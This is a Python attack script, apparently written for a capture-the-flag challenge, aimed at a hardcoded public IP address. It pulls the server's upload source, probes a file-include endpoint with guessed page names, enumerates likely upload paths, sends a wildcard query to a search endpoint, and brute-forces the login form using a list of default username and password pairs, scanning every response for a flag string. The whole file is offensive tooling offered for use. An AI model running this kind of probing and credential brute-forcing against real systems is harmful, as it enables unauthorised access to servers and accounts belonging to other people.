import requests
import re

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})
session.proxies = {}


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def get_full_source():
    """获取完整上传源码"""
    print_section("1. 获取完整上传源码")
    
    url = f"{TARGET}/upload-source"
    r = session.get(url, timeout=TIMEOUT)
    
    print(f"\n  完整源码:\n{r.text}")


def test_file_include_python():
    """测试文件包含执行Python代码"""
    print_section("2. 测试文件包含")
    
    include_url = f"{TARGET}/include"
    
    # 测试白名单页面
    r = session.get(include_url, params={"page": "welcome"}, timeout=TIMEOUT)
    print(f"\n  欢迎页面:\n{r.text}")
    
    # 测试其他页面
    include_payloads = [
        "welcome",
        "about",
        "home",
        "index",
        "test",
        "admin",
        "flag",
        "secret",
    ]
    
    for payload in include_payloads:
        try:
            r = session.get(include_url, params={"page": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                content = r.text[:500]
                
                if "flag" in content.lower():
                    print(f"\n  [{r.status_code}] ?page={payload}")
                    print(f"     响应: {content}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                    if flag_match:
                        print(f"     🚩 FLAG: {flag_match.group(0)}")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_additional_upload_paths():
    """测试其他上传路径"""
    print_section("3. 测试其他上传路径")
    
    upload_paths = [
        "/upload-test",
        "/upload_test",
        "/test-upload",
        "/api/upload",
        "/v1/upload",
        "/v2/upload",
        "/upload-api",
        "/upload/save",
        "/upload/submit",
        "/file/upload",
        "/files/upload",
        "/upload/file",
        "/uploads",
        "/upload.php",
        "/upload.py",
        "/test_upload",
        "/dev/upload",
        "/debug/upload",
        "/admin/upload",
        "/panel/upload",
    ]
    
    for path in upload_paths:
        url = f"{TARGET}{path}"
        try:
            r = session.get(url, timeout=TIMEOUT)
            
            if r.status_code == 200:
                print(f"\n  [{r.status_code}] {path}")
                print(f"     内容: {r.text[:200]}")
                
                flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
                if flag_match:
                    print(f"     🚩 FLAG: {flag_match.group(0)}")
                    
        except:
            pass


def test_sql_search_deep():
    """深入测试SQL搜索"""
    print_section("4. 深入测试SQL搜索")
    
    sql_url = f"{TARGET}/search"
    
    # 从之前的测试发现，% 返回了提示信息
    # 让我获取完整的响应
    r = session.get(sql_url, params={"q": "%"}, timeout=TIMEOUT)
    
    print(f"\n  SQL搜索结果:\n{r.text}")
    
    # 检查是否有隐藏信息
    flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
    if flag_match:
        print(f"\n  🚩 FLAG: {flag_match.group(0)}")


def test_login_brute_force():
    """测试登录暴力破解"""
    print_section("5. 测试登录凭据")
    
    url = f"{TARGET}/login"
    
    r = session.get(url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    # 从上传目录文件名猜测可能的凭据
    credentials = [
        ("admin", "admin"),
        ("admin", "123456"),
        ("admin", "password"),
        ("admin", "ctf"),
        ("admin", "term3lab"),
        ("admin", "flag"),
        ("admin", "test"),
        ("admin", "python"),
        ("admin", "lab"),
        ("admin", "123"),
        ("admin", "admin123"),
        ("admin", "password123"),
        ("root", "root"),
        ("root", "password"),
        ("root", "123456"),
        ("user", "user"),
        ("user", "password"),
        ("user", "123456"),
        ("test", "test"),
        ("test", "123456"),
        ("demo", "demo"),
        ("demo", "123456"),
        ("guest", "guest"),
        ("guest", "123456"),
        ("lab", "lab"),
        ("lab", "123456"),
        ("term3", "term3"),
        ("term3", "123456"),
    ]
    
    for username, password in credentials:
        try:
            data = {"username": username, "password": password, "csrf": csrf_token}
            r = session.post(url, data=data, timeout=TIMEOUT)
            
            if r.status_code == 200:
                if "用户名或密码错误" not in r.text:
                    print(f"\n  🎉 登录成功: {username}/{password}")
                    print(f"     内容: {r.text[:500]}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
                    if flag_match:
                        print(f"     🚩 FLAG: {flag_match.group(0)}")
                    return
                    
        except Exception as e:
            pass
    
    print("\n  ❌ 未找到有效凭据")


def main():
    print("*" * 70)
    print("  CTF漏洞分析")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    get_full_source()
    test_file_include_python()
    test_additional_upload_paths()
    test_sql_search_deep()
    test_login_brute_force()
    
    print_section("分析完成")


if __name__ == "__main__":
    main()